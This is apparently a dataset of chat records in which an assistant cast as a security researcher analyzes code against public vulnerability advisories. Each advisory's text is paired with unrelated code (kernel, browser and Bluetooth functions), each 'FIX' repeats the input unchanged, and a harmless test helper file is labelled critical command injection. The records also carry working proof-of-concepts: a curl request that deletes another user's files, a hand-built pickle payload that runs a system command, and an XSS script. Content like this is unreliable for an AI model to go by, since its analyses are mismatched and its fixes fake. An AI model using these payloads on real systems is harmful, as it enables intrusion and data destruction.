{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Lobe Chat has IDOR in Knowledge Base File Removal that Allows Cross User File Deletion:\n\nstatic struct dentry *lookup_dcache(const struct qstr *name,\n\t\t\t\t    struct dentry *dir,\n\t\t\t\t    unsigned int flags)\n{\n\tstruct dentry *dentry;\n\tint error;\n\n\tdentry = d_lookup(dir, name);\n\tif (dentry) {\n\t\tif (dentry->d_flags & DCACHE_OP_REVALIDATE) {\n\t\t\terror = d_revalidate(dentry, flags);\n\t\t\tif (unlikely(error <= 0)) {\n\t\t\t\tif (!error)\n\t\t\t\t\td_invalidate(dentry);\n\t\t\t\tdput(dentry);\n\t\t\t\treturn ERR_PTR(error);\n\t\t\t}\n\t\t}\n\t}\n\treturn dentry;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-284\nREASON: ### Summary\n\n`knowledgeBase.removeFilesFromKnowledgeBase` tRPC ep allows authenticated users to delete files from any knowledge base without verifying ownership.\n\n### Details\n\n`userId` filter in the database query is commented out, so it's enabling attackers to delete other users' KB files if they know the knowledge base ID and file ID.\n\n### PoC\n\n```\nATTACKER_TOKEN=\"xx\"\n\nVICTIM_KB=\"kb_tuLBfskdDN1r\"\nVICTIM_FILE=\"file_v5wCNLqSaoPp\"\n\ncurl -X POST \"https://localhost/trpc/lambda/knowledgeBase.removeFilesFromKnowledgeBase?batch=1\" -H \"Content-Type: application/json\" -b \"__Secure-better-auth.session_token=$ATTACKER_TOKEN\" -d '{\"0\":{\"json\":{\"knowledgeBaseId\":\"'\"$VICTIM_KB\"'\",\"ids\":[\"'\"$VICTIM_FILE\"'\"]}}}'\n```\n\nResponse:\n\n`{\"result\":{\"data\":{\"json\":{\"command\":\"DELETE\",\"rowCount\":1,\"oid\":null,\"rows\":[],\"fields\":[]}}}}`\n\n### Impact\n\nAn attacker can delete files from any user's KB. RAG/AI functionality broken when files removed. It could cause loss of important documents, proprietary data etc.\n\nWhile the vuln is confirmed, practical exploitation requires knowing target's KB ID and target's file ID. These IDs are random and not easily enumerable. However, IDs may leak through shared links, logs, referrer headers and so on. Missing authorization check is a critical security flaw regardless.\nFIX:\nstatic struct dentry *lookup_dcache(const struct qstr *name,\n\t\t\t\t    struct dentry *dir,\n\t\t\t\t    unsigned int flags)\n{\n\tstruct dentry *dentry;\n\tint error;\n\n\tdentry = d_lookup(dir, name);\n\tif (dentry) {\n\t\tif (dentry->d_flags & DCACHE_OP_REVALIDATE) {\n\t\t\terror = d_revalidate(dentry, flags);\n\t\t\tif (unlikely(error <= 0)) {\n\t\t\t\tif (!error)\n\t\t\t\t\td_invalidate(dentry);\n\t\t\t\tdput(dentry);\n\t\t\t\treturn ERR_PTR(error);\n\t\t\t}\n\t\t}\n\t}\n\treturn dentry;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Picklescan is vulnerable to RCE via missing detection when calling built-in python _operator.methodcaller:\n\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-94\nREASON: ### Summary\nPicklescan uses  _operator.methodcaller, which is a built-in python library function to execute remote pickle files.\n\n### Details\nThe attack payload executes in the following steps:\n\n- First, the attacker crafts the payload by calling to _operator.methodcaller function in reduce method\n- Then when after the victim after checks whether or not the pickle file is safe by using Picklescan library and the library doesn't dectect any dangerous functions, pickle.load()  loads this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n```\nimport pickle\nimport pickletools\nopcode2 = b'''cbuiltins\n__import__\n(Vos\ntRp0\n0c_operator\nmethodcaller\n(Vsystem\nVecho \"pwned by _operator.methodcaller\"\ntR(g0\ntR.'''\npickletools.dis(opcode2)\npickle.loads(opcode2)\n```\nThis PoC can't be easily create by pickle.dumps, so it was manually built. \n\n### Impact\nAny organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nAttackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nAttackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Report by\nPinji Chen (cpj24@mails.tsinghua.edu.cn) from NISL lab (https://netsec.ccert.edu.cn/about) at Tsinghua University, Guanheng Liu (coolwind326@gmail.com).\nFIX:\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n#include <inttypes.h> // for PRId64\n#include <stdio.h>\n#include <stdlib.h>\n#include <wctype.h>\n#include \"std_testcase.h\"\n\n#ifndef _WIN32\n#include <wchar.h>\n#endif\n\nvoid printLine (const char * line)\n{\n    if(line != NULL) \n    {\n        printf(\"%s\\n\", line);\n    }\n}\n\nvoid printWLine (const wchar_t * line)\n{\n    if(line != NULL) \n    {\n        wprintf(L\"%ls\\n\", line);\n    }\n}\n\nvoid printIntLine (int intNumber)\n{\n    printf(\"%d\\n\", intNumber);\n}\n\nvoid printShortLine (short shortNumber)\n{\n    printf(\"%hd\\n\", shortNumber);\n}\n\nvoid printFloatLine (float floatNumber)\n{\n    printf(\"%f\\n\", floatNumber);\n}\n\nvoid printLongLine (long longNumber)\n{\n    printf(\"%ld\\n\", longNumber);\n}\n\nvoid printLongLongLine (int64_t longLongIntNumber)\n{\n    printf(\"%\" PRId64 \"\\n\", longLongIntNumber);\n}\n\nvoid printSizeTLine (size_t sizeTNumber)\n{\n    printf(\"%zu\\n\", sizeTNumber);\n}\n\nvoid printHexCharLine (char charHex)\n{\n    printf(\"%02x\\n\", charHex);\n}\n\nvoid printWcharLine(wchar_t wideChar) \n{\n    /* ISO standard dictates wchar_t can be ref'd only with %ls, so we must make a\n     * string to print a wchar */\n    wchar_t s[2];\n        s[0] = wideChar;\n        s[1] = L'\\0';\n    printf(\"%ls\\n\", s);\n}\n\nvoid printUnsignedLine(unsigned unsignedNumber) \n{\n    printf(\"%u\\n\", unsignedNumber);\n}\n\nvoid printHexUnsignedCharLine(unsigned char unsignedCharacter) \n{\n    printf(\"%02x\\n\", unsignedCharacter);\n}\n\nvoid printDoubleLine(double doubleNumber) \n{\n    printf(\"%g\\n\", doubleNumber);\n}\n\nvoid printStructLine (const twoIntsStruct * structTwoIntsStruct)\n{\n    printf(\"%d -- %d\\n\", structTwoIntsStruct->intOne, structTwoIntsStruct->intTwo);\n}\n\nvoid printBytesLine(const unsigned char * bytes, size_t numBytes)\n{\n    size_t i;\n    for (i = 0; i < numBytes; ++i)\n    {\n        printf(\"%02x\", bytes[i]);\n    }\n    puts(\"\");\t/* output newline */\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\nsize_t decodeHexChars(unsigned char * bytes, size_t numBytes, const char * hex)\n{\n    size_t numWritten = 0;\n\n    /* We can't sscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling sscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && isxdigit(hex[2 * numWritten]) && isxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        sscanf(&hex[2 * numWritten], \"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\n size_t decodeHexWChars(unsigned char * bytes, size_t numBytes, const wchar_t * hex)\n {\n    size_t numWritten = 0;\n\n    /* We can't swscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling swscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && iswxdigit(hex[2 * numWritten]) && iswxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        swscanf(&hex[2 * numWritten], L\"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* The two functions always return 1 or 0, so a tool should be able to \n   identify that uses of these functions will always return these values */\nint globalReturnsTrue() \n{\n    return 1;\n}\n\nint globalReturnsFalse() \n{\n    return 0;\n}\n\nint globalReturnsTrueOrFalse() \n{\n    return (rand() % 2);\n}\n\n/* The variables below are declared \"const\", so a tool should\n   be able to identify that reads of these will always return their \n   initialized values. */\nconst int GLOBAL_CONST_TRUE = 1; /* true */\nconst int GLOBAL_CONST_FALSE = 0; /* false */\nconst int GLOBAL_CONST_FIVE = 5; \n\n/* The variables below are not defined as \"const\", but are never\n   assigned any other value, so a tool should be able to identify that\n   reads of these will always return their initialized values. */\nint globalTrue = 1; /* true */\nint globalFalse = 0; /* false */\nint globalFive = 5; \n\n/* define a bunch of these as empty functions so that if a test case forgets\n   to make their's statically scoped, we'll get a linker error */\nvoid good1() { }\nvoid good2() { }\nvoid good3() { }\nvoid good4() { }\nvoid good5() { }\nvoid good6() { }\nvoid good7() { }\nvoid good8() { }\nvoid good9() { }\n\n/* shouldn't be used, but just in case */\nvoid bad1() { }\nvoid bad2() { }\nvoid bad3() { }\nvoid bad4() { }\nvoid bad5() { }\nvoid bad6() { }\nvoid bad7() { }\nvoid bad8() { }\nvoid bad9() { }\n\n/* define global argc and argv */\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nint globalArgc = 0;\nchar** globalArgv = NULL;\n\n#ifdef __cplusplus\n}\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"os_command_injection\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code allows untrusted input to be executed as operating system commands. Attackers can exploit this to execute arbitrary commands on the server with the application's privileges.\",\n  \"risk\": \"Complete system compromise, arbitrary command execution, data theft, system modification\",\n  \"compliant_patch\": \"\\n// FIXED: Use parameterized commands or input validation\\n// Instead of: system(user_input)\\n// Use: validated_input = validate_user_input(user_input);\\n//       system(escape_shell_command(validated_input));\\n\\n// Or better, use library functions that handle arguments safely:\\n// execvp() with proper argument array\\n// or use higher-level APIs that avoid shell entirely\\n\",\n  \"source\": \"SARD-248694\",\n  \"cwe\": \"CWE-78\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for DIRAC: Unauthorized users can read proxy contents during generation:\n\nvoid DevToolsWindow::DoAction(const DevToolsToggleAction& action) {\n  switch (action.type()) {\n    case DevToolsToggleAction::kInspect:\n      bindings_->CallClientFunction(\"DevToolsAPI.enterInspectElementMode\", NULL,\n                                    NULL, NULL);\n      break;\n\n    case DevToolsToggleAction::kShowElementsPanel:\n    case DevToolsToggleAction::kShowConsolePanel:\n    case DevToolsToggleAction::kShow:\n    case DevToolsToggleAction::kToggle:\n      break;\n\n    case DevToolsToggleAction::kReveal: {\n      const DevToolsToggleAction::RevealParams* params =\n          action.params();\n      CHECK(params);\n      base::Value url_value(params->url);\n      base::Value line_value(static_cast<int>(params->line_number));\n      base::Value column_value(static_cast<int>(params->column_number));\n      bindings_->CallClientFunction(\"DevToolsAPI.revealSourceLine\",\n                                    &url_value, &line_value, &column_value);\n      break;\n    }\n    default:\n      NOTREACHED();\n      break;\n  }\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-668\nREASON: ### Impact\n\nDuring the proxy generation process (e.g., when using `dirac-proxy-init`) it is possible for unauthorized users on the same machine to gain read access to the proxy. This allows the user to then perform any action that is possible with the original proxy.\n\nThis vulnerability only exists for a short period of time (sub-millsecond) during the generation process.\n\n### Patches\n\n_Has the problem been patched? What versions should users upgrade to?_\n\n### Workarounds\n\nSetting the `X509_USER_PROXY` environment variable to a path that is inside a directory that is only readable to the current user avoids the potential risk. After the file has been written it can be safely copied to the standard location (`/tmp/x509up_uNNNN`).\n\n### References\nFIX:\nvoid DevToolsWindow::DoAction(const DevToolsToggleAction& action) {\n  switch (action.type()) {\n    case DevToolsToggleAction::kInspect:\n      bindings_->CallClientFunction(\"DevToolsAPI.enterInspectElementMode\", NULL,\n                                    NULL, NULL);\n      break;\n\n    case DevToolsToggleAction::kShowElementsPanel:\n    case DevToolsToggleAction::kShowConsolePanel:\n    case DevToolsToggleAction::kShow:\n    case DevToolsToggleAction::kToggle:\n      break;\n\n    case DevToolsToggleAction::kReveal: {\n      const DevToolsToggleAction::RevealParams* params =\n          action.params();\n      CHECK(params);\n      base::Value url_value(params->url);\n      base::Value line_value(static_cast<int>(params->line_number));\n      base::Value column_value(static_cast<int>(params->column_number));\n      bindings_->CallClientFunction(\"DevToolsAPI.revealSourceLine\",\n                                    &url_value, &line_value, &column_value);\n      break;\n    }\n    default:\n      NOTREACHED();\n      break;\n  }\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for XXE vulnerability in XSLT parsing in `org.hl7.fhir.publisher`:\n\nget_hash_secret_salt(XML_Parser parser) {\n  if (parser->m_parentParser != NULL)\n    return get_hash_secret_salt(parser->m_parentParser);\n  return parser->m_hash_secret_salt;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-611\nREASON: ### Impact\nXSLT transforms performed by various components are vulnerable to XML external entity injections. A processed XML file with a malicious DTD tag ( ]> could produce XML containing data from the host system. This impacts use cases where org.hl7.fhir.publisher is being used to within a host where external clients can submit XML.\n\nA previous release provided an incomplete solution revealed by new testing. \n\n### Patches\nThis issue has been patched as of version 1.7.4\n\n### Workarounds\nNone\n\n### References\n[Previous Advisory for Incomplete solution](https://github.com/HL7/fhir-ig-publisher/security/advisories/GHSA-59rq-22fm-x8q5)\n[MITRE CWE](https://cwe.mitre.org/data/definitions/611.html)\n[OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#transformerfactory)\nFIX:\nget_hash_secret_salt(XML_Parser parser) {\n  if (parser->m_parentParser != NULL)\n    return get_hash_secret_salt(parser->m_parentParser);\n  return parser->m_hash_secret_salt;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Traefik Inverted TLS Verification Logic in ingress-nginx Provider:\n\ninf_gtk_certificate_manager_class_init(\n  InfGtkCertificateManagerClass* certificate_manager_class)\n{\n  GObjectClass* object_class;\n  object_class = G_OBJECT_CLASS(certificate_manager_class);\n\n  object_class->dispose = inf_gtk_certificate_manager_dispose;\n  object_class->finalize = inf_gtk_certificate_manager_finalize;\n  object_class->set_property = inf_gtk_certificate_manager_set_property;\n  object_class->get_property = inf_gtk_certificate_manager_get_property;\n\n  g_object_class_install_property(\n    object_class,\n    PROP_PARENT_WINDOW,\n    g_param_spec_object(\n      \"parent-window\",\n      \"Parent window\",\n      \"The parent window for certificate approval dialogs\",\n      GTK_TYPE_WINDOW,\n      G_PARAM_READWRITE | G_PARAM_CONSTRUCT_ONLY\n    )\n  );\n\n  g_object_class_install_property(\n    object_class,\n    PROP_XMPP_MANAGER,\n    g_param_spec_object(\n      \"xmpp-manager\",\n      \"XMPP manager\",\n      \"The XMPP manager of registered connections\",\n      INF_TYPE_XMPP_MANAGER,\n      G_PARAM_READWRITE | G_PARAM_CONSTRUCT_ONLY\n    )\n  );\n\n  g_object_class_install_property(\n    object_class,\n    PROP_KNOWN_HOSTS_FILE,\n    g_param_spec_string(\n      \"known-hosts-file\",\n      \"Known hosts file\",\n      \"File containing certificates of known hosts\",\n      NULL,\n      G_PARAM_READWRITE\n    )\n  );\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-295\nREASON: ## Impact\n\nThere is a potential vulnerability in Traefik NGINX provider managing the `nginx.ingress.kubernetes.io/proxy-ssl-verify` annotation.\n\nThe provider inverts the semantics of the `nginx.ingress.kubernetes.io/proxy-ssl-verify` annotation. Setting the annotation to `\"on\"` (intending to enable backend TLS certificate verification) actually disables verification, allowing man-in-the-middle attacks against HTTPS backends when operators believe they are protected.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v3.6.3\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n<details>\n<summary>Original Description</summary>\n\n### Summary\n\nA logic error in Traefik's experimental ingress-nginx provider inverts the semantics of the `nginx.ingress.kubernetes.io/proxy-ssl-verify` annotation. Setting the annotation to `\"on\"` (intending to enable backend TLS certificate verification) actually disables verification, allowing man-in-the-middle attacks against HTTPS backends when operators believe they are protected.\n\n### Details\n\nIn `pkg/provider/kubernetes/ingress-nginx/kubernetes.go` at line 512, the `InsecureSkipVerify` field is set using inverted logic:\n\n```go\nnst := &namedServersTransport{\n    Name: provider.Normalize(namespace + \"-\" + name),\n    ServersTransport: &dynamic.ServersTransport{\n        ServerName:         ptr.Deref(cfg.ProxySSLName, ptr.Deref(cfg.ProxySSLServerName, \"\")),\n        InsecureSkipVerify: strings.ToLower(ptr.Deref(cfg.ProxySSLVerify, \"off\")) == \"on\",\n    },\n}\n```\n\nThe expression `== \"on\"` evaluates to `true` when the annotation is `\"on\"`, setting `InsecureSkipVerify: true`. In Go's `crypto/tls`, `InsecureSkipVerify: true` means \"do not verify the server's certificate\" \u2014 the opposite of what `proxy-ssl-verify: \"on\"` should do according to NGINX semantics.\n\n**Current behavior:**\n| Annotation Value | InsecureSkipVerify | Actual Result |\n|------------------|-------------------|---------------|\n| `\"on\"` | `true` | Verification **disabled** \u274c |\n| `\"off\"` (default) | `false` | Verification **enabled** |\n\n**Expected behavior (per NGINX semantics):**\n| Annotation Value | InsecureSkipVerify | Expected Result |\n|------------------|-------------------|-----------------|\n| `\"on\"` | `false` | Verification **enabled** |\n| `\"off\"` (default) | `true` | Verification **disabled** |\n\nThe test in `pkg/provider/kubernetes/ingress-nginx/kubernetes_test.go` lines 397-403 confirms this inverted behavior is codified as \"expected\":\n\n```go\nServersTransports: map[string]*dynamic.ServersTransport{\n    \"default-ingress-with-proxy-ssl\": {\n        ServerName:         \"whoami.localhost\",\n        InsecureSkipVerify: true,  // Wrong: should be false when annotation is \"on\"\n        RootCAs:            []types.FileOrContent{\"-----BEGIN CERTIFICATE-----\"},\n    },\n},\n```\n\n**Affected versions:** v3.5.0 through current master (introduced in commit `9bd5c617820f2a8d23b50b68d114bb7bc464eccd`)\n\nPavel Kohout\nAisle Research\n</details>\n\n-\nFIX:\ninf_gtk_certificate_manager_class_init(\n  InfGtkCertificateManagerClass* certificate_manager_class)\n{\n  GObjectClass* object_class;\n  object_class = G_OBJECT_CLASS(certificate_manager_class);\n\n  object_class->dispose = inf_gtk_certificate_manager_dispose;\n  object_class->finalize = inf_gtk_certificate_manager_finalize;\n  object_class->set_property = inf_gtk_certificate_manager_set_property;\n  object_class->get_property = inf_gtk_certificate_manager_get_property;\n\n  g_object_class_install_property(\n    object_class,\n    PROP_PARENT_WINDOW,\n    g_param_spec_object(\n      \"parent-window\",\n      \"Parent window\",\n      \"The parent window for certificate approval dialogs\",\n      GTK_TYPE_WINDOW,\n      G_PARAM_READWRITE | G_PARAM_CONSTRUCT_ONLY\n    )\n  );\n\n  g_object_class_install_property(\n    object_class,\n    PROP_XMPP_MANAGER,\n    g_param_spec_object(\n      \"xmpp-manager\",\n      \"XMPP manager\",\n      \"The XMPP manager of registered connections\",\n      INF_TYPE_XMPP_MANAGER,\n      G_PARAM_READWRITE | G_PARAM_CONSTRUCT_ONLY\n    )\n  );\n\n  g_object_class_install_property(\n    object_class,\n    PROP_KNOWN_HOSTS_FILE,\n    g_param_spec_string(\n      \"known-hosts-file\",\n      \"Known hosts file\",\n      \"File containing certificates of known hosts\",\n      NULL,\n      G_PARAM_READWRITE\n    )\n  );\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for n8n: Webhook Node IP Whitelist Bypass via Partial String Matching:\n\nstatic void on_l2cap_outgoing_congest(tBTA_JV_L2CAP_CONG *p, uint32_t id)\n{\n    l2cap_socket *sock;\n\n    pthread_mutex_lock(&state_lock);\n    sock = btsock_l2cap_find_by_id_l(id);\n if (sock) {\n        sock->outgoing_congest = p->cong ? 1 : 0;\n if (!sock->outgoing_congest) {\n            APPL_TRACE_DEBUG(\"on_l2cap_outgoing_congest: adding fd to btsock_thread...\");\n            btsock_thread_add_fd(pth, sock->our_fd, BTSOCK_L2CAP, SOCK_THREAD_FD_RD, sock->id);\n\n }\n }\n    pthread_mutex_unlock(&state_lock);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-284\nREASON: ## Impact\nThe Webhook node\u2019s IP whitelist validation performed partial string matching instead of exact IP comparison. As a result, an incoming request could be accepted if the source IP address merely contained the configured whitelist entry as a substring.\n\nThis issue affected instances where workflow editors relied on IP-based access controls to restrict webhook access. Both IPv4 and IPv6 addresses were impacted. An attacker with a non-whitelisted IP could bypass restrictions if their IP shared a partial prefix with a trusted address, undermining the intended security boundary.\n\n## Patches\nThis issue has been patched in version 2.2.0.\n\nUsers are advised to upgrade to v2.2.0 or later, where IP whitelist validation uses strict IP comparison logic rather than partial string matching.\n\n## Workarounds\nUsers unable to upgrade immediately should avoid relying solely on IP whitelisting for webhook security. Recommended mitigations include:\n- Adding authentication mechanisms such as shared secrets, HMAC signatures, or API keys.\n- Avoiding short or prefix-based whitelist entries.\n- Enforcing IP filtering at the network layer (for example, via reverse proxies or firewalls).\nFIX:\nstatic void on_l2cap_outgoing_congest(tBTA_JV_L2CAP_CONG *p, uint32_t id)\n{\n    l2cap_socket *sock;\n\n    pthread_mutex_lock(&state_lock);\n    sock = btsock_l2cap_find_by_id_l(id);\n if (sock) {\n        sock->outgoing_congest = p->cong ? 1 : 0;\n if (!sock->outgoing_congest) {\n            APPL_TRACE_DEBUG(\"on_l2cap_outgoing_congest: adding fd to btsock_thread...\");\n            btsock_thread_add_fd(pth, sock->our_fd, BTSOCK_L2CAP, SOCK_THREAD_FD_RD, sock->id);\n\n }\n }\n    pthread_mutex_unlock(&state_lock);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for mcp-server-git : Path traversal in git_add allows staging files outside repository boundaries:\n\nprefix_components (char *filename, bool checkdirs)\n{\n  int count = 0;\n  struct stat stat_buf;\n  int stat_result;\n  char *f = filename + FILE_SYSTEM_PREFIX_LEN (filename);\n\n  if (*f)\n    while (*++f)\n      if (ISSLASH (f[0]) && ! ISSLASH (f[-1]))\n\t{\n\t  if (checkdirs)\n\t    {\n\t      *f = '\\0';\n\t      stat_result = lstat (filename, &stat_buf);\n\t      *f = '/';\n\t      if (! (stat_result == 0 && S_ISDIR (stat_buf.st_mode)))\n\t\tbreak;\n\t    }\n\n\t  count++;\n\t}\n\n  return count;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: In `mcp-server-git` versions prior to 2026.1.14, the `git_add` tool did not validate that file paths provided in the files argument were within the repository boundaries. The tool used GitPython's `repo.index.add(`, which did not enforce working-tree boundary checks for relative paths. As a result, relative paths containing `../` sequences that resolved outside the repository were accepted and staged into the Git index, potentially allowing sensitive files to be exfiltrated via subsequent commit and push operations. The fix in PR #3164 switches to `repo.git.add()`, which delegates to the Git CLI and properly rejects out-of-tree paths. Users are advised to upgrade to 2026.1.14 or newer to remediate this issue.\n\nmcp-server-git thanks https://hackerone.com/0dd-g for reporting and contributing the fix.\nFIX:\nprefix_components (char *filename, bool checkdirs)\n{\n  int count = 0;\n  struct stat stat_buf;\n  int stat_result;\n  char *f = filename + FILE_SYSTEM_PREFIX_LEN (filename);\n\n  if (*f)\n    while (*++f)\n      if (ISSLASH (f[0]) && ! ISSLASH (f[-1]))\n\t{\n\t  if (checkdirs)\n\t    {\n\t      *f = '\\0';\n\t      stat_result = lstat (filename, &stat_buf);\n\t      *f = '/';\n\t      if (! (stat_result == 0 && S_ISDIR (stat_buf.st_mode)))\n\t\tbreak;\n\t    }\n\n\t  count++;\n\t}\n\n  return count;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for pypdf has possible long runtimes for missing /Root object with large /Size values:\n\nstatic inline enum fbq_type fbq_classify_rq(struct rq *rq)\n{\n\treturn regular;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-400\nREASON: ### Impact\nAn attacker who exploits this vulnerability can craft a PDF which leads to possibly long runtimes for actually invalid files. This can be achieved by omitting the `/Root` entry in the trailer, while using a rather large `/Size` value. Only the non-strict reading mode is affected.\n\n### Patches\nThis has been fixed in [pypdf==6.6.0](https://github.com/py-pdf/pypdf/releases/tag/6.6.0).\n\n### Workarounds\n\n```python\nfrom pypdf import PdfReader, PdfWriter\n\n\n# Instead of\nreader = PdfReader(\"file.pdf\")\n# use the strict mode:\nreader = PdfReader(\"file.pdf\", strict=True)\n\n# Instead of\nwriter = PdfWriter(clone_from=\"file.pdf\")\n# use an explicit strict reader:\nwriter = PdfWriter(clone_from=PdfReader(\"file.pdf\", strict=True))\n```\n\n### Resources\nThis issue has been fixed in #3594.\nFIX:\nstatic inline enum fbq_type fbq_classify_rq(struct rq *rq)\n{\n\treturn regular;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Grav vulnerable to Cross-Site Scripting (XSS) Stored endpoint `/admin/pages/[page]` parameter `data[header][template]` in Advanced Tab:\n\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ## Summary\n\nA Stored Cross-Site Scripting (XSS) vulnerability was identified in the `/admin/pages/[page]` endpoint of the _Grav_ application. This vulnerability allows attackers to inject malicious scripts into the `data[header][template]` parameter. The script is saved within the page's frontmatter and executed automatically whenever the affected content is rendered in the administrative interface or frontend view.\n\n---\n\n## Details\n\n**Vulnerable Endpoint:** `POST /admin/pages/[page]`  \n**Parameter:** `data[header][template]`\n\nThe application fails to properly sanitize user input in the `data[header][template]` field, which is stored in the YAML frontmatter of the page. An attacker can inject JavaScript code using this field, and the payload is rendered and executed when the page is accessed, especially within the Admin Panel interface.\n\n---\n\n## PoC\n\n**Payload:**\n\n`<script>alert('PoC-XXS73')</script>`\n\n### Steps to Reproduce:\n\n1. Log in to the _Grav_ Admin Panel and navigate to **Pages**.\n    \n2. Create a new page or edit an existing one.\n    \n3. In the **Advanced > Template** field (which maps to `data[header][template]`), insert the payload:\n![image](https://github.com/user-attachments/assets/fc92aa09-e363-4422-b577-63aa27097886)\n\n4. Save the page.\n    \n5. Return to the **Pages** section and click on the **three-dot menu** of the affected page: \n![image](https://github.com/user-attachments/assets/ea6a023b-f838-4700-b2a8-8dcfbca37f00)\n\n6. The stored XSS payload is triggered, and the script is executed in the browser:\n![image](https://github.com/user-attachments/assets/8cf1cca5-ce8f-4b09-a57c-0848090918ac)\n---\n\n## Impact\n\nStored XSS vulnerabilities can have serious consequences, including:\n\n- **Session hijacking:** Capturing admin session cookies or tokens\n    \n- **Malware delivery:** Executing scripts that load malicious resources\n    \n- **Credential theft:** Creating fake login prompts to steal usernames/passwords\n    \n- **Data exposure:** Reading sensitive metadata or page contents\n    \n- **Privilege escalation:** Performing actions as an authenticated user\n    \n- **Website defacement:** Altering visual or functional elements of the site\n    \n- **Reputation damage:** Undermining user trust in the application\n\nby\u00a0[CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)\nFIX:\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for @fastify/middie has Improper Path Normalization when Using Path-Scoped Middleware:\n\nbool BrowserView::IsVisible() const {\n  return frame_->IsVisible();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-20\nREASON: ## Summary\nA path normalization inconsistency in `@fastify/middie` can result in authentication/authorization bypass when using path-scoped middleware (for example, `app.use('/secret', auth)`).\n\nWhen Fastify router normalization options are enabled (such as `ignoreDuplicateSlashes`, `useSemicolonDelimiter`, and related trailing-slash behavior), crafted request paths may bypass middleware checks while still being routed to protected handlers.\n\n## Impact\nAn unauthenticated remote attacker can access endpoints intended to be protected by middleware-based auth/authorization controls by sending specially crafted URL paths (for example, `//secret` or `/secret;foo=bar`), depending on router option configuration.\n\nThis may lead to unauthorized access to protected functionality and data exposure.\n\n## Affected versions\n- Confirmed affected: `@fastify/middie@9.1.0`\n- All versions prior to the patch are affected.\n\n## Patched versions\n- Fixed in: *9.2.0*\n\n## Details\nThe issue is caused by canonicalization drift between:\n1. `@fastify/middie` path matching for `app.use('/prefix', ...)`, and\n2. Fastify/find-my-way route lookup normalization.\n\nBecause middleware and router did not always evaluate the same normalized path, auth middleware could be skipped while route resolution still succeeded.\n\n## Workarounds\nUntil patched version is deployed:\n- Avoid relying solely on path-scoped middie guards for auth/authorization.\n- Enforce auth at route-level handlers/hooks after router normalization.\n- Disable risky normalization combinations only if operationally feasible.\n\n## Resources\n- Fluid Attacks Disclosure Policy: https://fluidattacks.com/advisories/policy\n- Fluid Attacks advisory URL: https://fluidattacks.com/advisories/jimenez\n\n## Credits\n- **Cristian Vargas** (Fluid Attacks Research Team) 